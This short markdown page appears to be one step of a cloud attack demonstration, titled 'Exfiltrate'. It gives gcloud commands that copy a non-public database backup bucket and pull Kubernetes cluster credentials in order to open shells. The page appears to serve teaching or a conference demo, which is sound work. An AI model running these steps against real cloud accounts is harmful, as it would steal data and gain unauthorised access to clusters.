# Exfiltrate 
Now that we have some access, we can exfiltrate data.

## The database backup bucket
We saw, that there is a database backup in a Storage.
That storage can be downloaded - even though it has disabled public access.

```bash
mkdir -p /root/demotalk/exfiltrate
cd /root/demotalk/exfiltrate

gcloud storage cp -r gs://conduit-database-backup-test/ .
```

## Connect to Kubernetes
Let's access K8s and then start some shells

```bash
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test

octant
```